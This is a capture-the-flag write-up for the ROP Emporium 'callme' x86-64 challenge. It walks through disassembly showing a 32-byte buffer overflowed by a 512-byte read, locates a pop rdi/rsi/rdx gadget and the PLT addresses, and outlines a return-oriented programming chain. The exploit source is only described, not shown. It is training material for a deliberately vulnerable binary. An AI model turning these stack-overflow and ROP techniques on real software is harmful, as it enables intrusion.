## Solution

I did the x86-64 version of this challenge which is slightly different than the x86 version. This is beacause of the way parameters are passed into functions. Overall this challenge was completed a lot faster than the previous one. The real challenge is the exploit, which is written in C.

The link to the challenge page is [here](https://ropemporium.com/challenge/callme.html).

The challenge description says to use the .plt to make calls to several functions in the program. These are located above (*callme_one()*, *callme_two()*, *callme_three()*) and are linked at runtime in the .got.plt. These functions are in another library that is included with the challenge. The goal is to call all three functions with the parameters *0xdeadbeefdeadbeef*, *0xcafebabecafebabe*, and *0xd00df00dd00df00d*.

### Initial Recon

running rabin2 -I shows that the binary has NX enabled but has canaries turned off

```sh
arch     x86
baddr    0x400000
binsz    6952
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    .
sanitize false
static   false
stripped false
subsys   linux
va       true
```

### Exploration

After opening the function in r2 I checked the function table

```asm
[0x00400760]> afl
0x00400760    1     42 entry0
0x004006a8    3     23 sym._init
0x004009b4    1      9 sym._fini
0x004007a0    4     37 sym.deregister_tm_clones
0x004007d0    4     55 sym.register_tm_clones
0x00400810    3     29 sym.__do_global_dtors_aux
0x00400840    1      7 sym.frame_dummy
0x00400898    1     90 sym.pwnme
0x00400700    1      6 sym.imp.memset
0x004006d0    1      6 sym.imp.puts
0x004006e0    1      6 sym.imp.printf
0x00400710    1      6 sym.imp.read
0x004008f2    1     74 sym.usefulFunction
0x004006f0    1      6 sym.imp.callme_three
0x00400740    1      6 sym.imp.callme_two
0x00400720    1      6 sym.imp.callme_one
0x00400750    1      6 sym.imp.exit
0x004009b0    1      2 sym.__libc_csu_fini
0x00400940    4    101 sym.__libc_csu_init
0x00400790    1      2 sym._dl_relocate_static_pie
0x00400847    1     81 main
0x00400730    1      6 sym.imp.setvbuf
```

The same functions have returned again(*pwnme()*, *usefulFunction()*). Taking a look we can see that *pwnme()* is sort of the same as last time.

```asm
┌ sym.pwnme ();
│           ; var void *buf @ rbp-0x20
│           0x00400898      55             push rbp
│           0x00400899      4889e5         mov rbp, rsp
│           0x0040089c      4883ec20       sub rsp, 0x20
│           0x004008a0      488d45e0       lea rax, [buf]
│           0x004008a4      ba20000000     mov edx, 0x20               ; 32 ; size_t n
│           0x004008a9      be00000000     mov esi, 0                  ; int c
│           0x004008ae      4889c7         mov rdi, rax                ; void *s
│           0x004008b1      e84afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x004008b6      bff0094000     mov edi, str.Hope_you_read_the_instructions..._n ; 0x4009f0 ; "Hope you read the instructions...\n" ; const char *s
│           0x004008bb      e810feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004008c0      bf130a4000     mov edi, 0x400a13           ; '\x13\n@' ; "> " ; const char *format
│           0x004008c5      b800000000     mov eax, 0
│           0x004008ca      e811feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004008cf      488d45e0       lea rax, [buf]
│           0x004008d3      ba00020000     mov edx, 0x200              ; 512 ; size_t nbyte
│           0x004008d8      4889c6         mov rsi, rax                ; void *buf
│           0x004008db      bf00000000     mov edi, 0                  ; int fildes
│           0x004008e0      e82bfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x004008e5      bf160a4000     mov edi, str.Thank_you_     ; 0x400a16 ; "Thank you!" ; const char *s
│           0x004008ea      e8e1fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004008ef      90             nop
│           0x004008f0      c9             leave
└           0x004008f1      c3             ret

```

In this function you have a buffer of 32 bytes being filled with 512 bytes from the read function.

taking a look at the *usefulFunction()* shows that the functions are being called differetly this time.

```asm
┌ sym.usefulFunction ();
│           0x004008f2      55             push rbp
│           0x004008f3      4889e5         mov rbp, rsp
│           0x004008f6      ba06000000     mov edx, 6
│           0x004008fb      be05000000     mov esi, 5
│           0x00400900      bf04000000     mov edi, 4
│           0x00400905      e8e6fdffff     call sym.imp.callme_three
│           0x0040090a      ba06000000     mov edx, 6
│           0x0040090f      be05000000     mov esi, 5
│           0x00400914      bf04000000     mov edi, 4
│           0x00400919      e822feffff     call sym.imp.callme_two
│           0x0040091e      ba06000000     mov edx, 6
│           0x00400923      be05000000     mov esi, 5
│           0x00400928      bf04000000     mov edi, 4
│           0x0040092d      e8eefdffff     call sym.imp.callme_one
│           0x00400932      bf01000000     mov edi, 1                  ; int status
└           0x00400937      e814feffff     call sym.imp.exit           ; void exit(int status)
```

### Generating the Exploit

The offset to ret is 40 once again. This challenge is simular to the *split* challenge in that you need a gadget to load the paramters into the correct registers. This time there are three, so we need to fill rdi, rsi, rdx.

Running the command below shows us the gadget and address we need to build part of the ROP chain.

> /R pop rdi

```asm
0x0040093c                 5f  pop rdi
0x0040093d                 5e  pop rsi
0x0040093e                 5a  pop rdx
0x0040093f                 c3  ret
```

We also need the addresses for the three callme functions. This is a little different than previous times since the functions are not in the binary itself. When I ran the *afl* command earlier It actually showed the correct address frfrom the .plt section of the binary that we need to properly call it. Just to check and prove that they are the correct we can check the plt.

> plt (Procedure Linkage Table) is used to call external functions whose address isn't known at the time of linking, and needs to be resolved by the dynamic linker at run time.

In this challenge we need to use the address in the .plt section instead of the call in *usefulFunction()*. This is because the functions are externeal to the binary.

This is the plt section for the three functions

```asm
  ╎╎╎╎╎╎╎   ; CALL XREF from sym.usefulFunction @ 0x400905(x)
┌ 6: sym.imp.callme_three ();
└ ╎╎╎╎╎╎╎   0x004006f0      ff2532092000   jmp qword [reloc.callme_three] ; [0x601028:8]=0x4006f6
  ╎╎╎╎╎╎╎   0x004006f6      6802000000     push 2                      ; 2
  └───────< 0x004006fb      e9c0ffffff     jmp sym..plt
            ; CALL XREF from sym.usefulFunction @ 0x40092d(x)
┌ 6: sym.imp.callme_one ();
└    ╎╎╎╎   0x00400720      ff251a092000   jmp qword [reloc.callme_one] ; [0x601040:8]=0x400726 ; "&\a@"
     ╎╎╎╎   0x00400726      6805000000     push 5                      ; 5
     └────< 0x0040072b      e990ffffff     jmp sym..plt
       ╎╎   ; CALL XREF from sym.usefulFunction @ 0x400919(x)
┌ 6: sym.imp.callme_two ();
└      ╎╎   0x00400740      ff250a092000   jmp qword [reloc.callme_two] ; [0x601050:8]=0x400746 ; "F\a@"
       ╎╎   0x00400746      6807000000     push 7                      ; 7
       └──< 0x0040074b      e970ffffff     jmp sym..plt
```

The addresses that we need are the first jumps in each section(*0x00400720*, *0x00400740*, *0x004006f0*).

### Building the Exploit

our exploit will look something like this,

```sh
40 junk padding + gadget + args + callme_one + gadget + args + callme_two + gadget + args + callme_three
```

I wrote the exploit in C and is included with comments describing it better in the source code.

### Flag
After building and running the exploit we get the flag,

```sh
❯ make
gcc ./exploit.c -o exp
./exp
callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```
